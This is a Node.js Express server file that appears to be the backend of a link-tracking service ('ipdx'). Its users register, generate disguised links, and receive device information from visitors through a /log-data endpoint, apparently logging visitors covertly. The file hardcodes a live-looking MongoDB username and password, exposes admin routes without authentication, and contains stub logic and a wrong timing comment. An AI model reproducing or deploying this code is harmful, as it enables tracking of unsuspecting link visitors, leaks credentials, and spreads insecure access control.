const express = require('express');
const mongoose = require('mongoose');
const crypto = require('crypto');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// MongoDB Connection
const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/?appName=Cluster0";
mongoose.connect(MONGO_URI).then(() => console.log("Connected to MongoDB"));

// Schemas
const userSchema = new mongoose.Schema({
    name: String,
    uid: String,
    isBanned: { type: Boolean, default: false },
    urls: [{ type: String, custom: Boolean, redirect: String }]
});

const dataSchema = new mongoose.Schema({
    uid: String,
    deviceInfo: Object,
    timestamp: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Data = mongoose.model('Data', dataSchema);

// Self-Ping to keep alive on Render
setInterval(() => {
    axios.get('https://ipdx.onrender.com/ping').catch(e => console.log("Ping failed"));
}, 300000); // 10 minutes

app.get('/ping', (req, res) => res.send('Active'));

// [Registration]
app.post('/register', async (req, res) => {
    const { name } = req.body;
    const uid = crypto.randomBytes(6).toString('hex'); // 11-12 chars
    const newUser = new User({ name, uid });
    await newUser.save();
    res.json({ name, uid });
});

// [Create URL]
app.post('/create-url', async (req, res) => {
    const { uid, customSlug, redirect } = req.body;
    const user = await User.findOne({ uid });
    if (!user || user.isBanned) return res.status(403).json({ error: "Banned or Invalid User" });
    
    const finalSlug = customSlug || crypto.randomBytes(4).toString('hex');
    res.json({ url: `https://${req.get('host')}/v/${finalSlug}`, slug: finalSlug });
});

// [Log Data from HTML]
app.post('/log-data', async (req, res) => {
    const { uid, info } = req.body;
    const newData = new Data({ uid, deviceInfo: info });
    await newData.save();
    res.sendStatus(200);
});

// [Delete Custom URL on Exit]
app.post('/remove-custom', async (req, res) => {
    const { slug } = req.body;
    // Logic to deactivate the specific slug
    res.json({ status: "Removed" });
});

// [Admin Routes]
app.get('/admin/users', async (req, res) => res.json(await User.find()));
app.post('/admin/ban', async (req, res) => {
    await User.updateOne({ uid: req.body.uid }, { isBanned: true });
    res.json({ status: "User Banned" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));
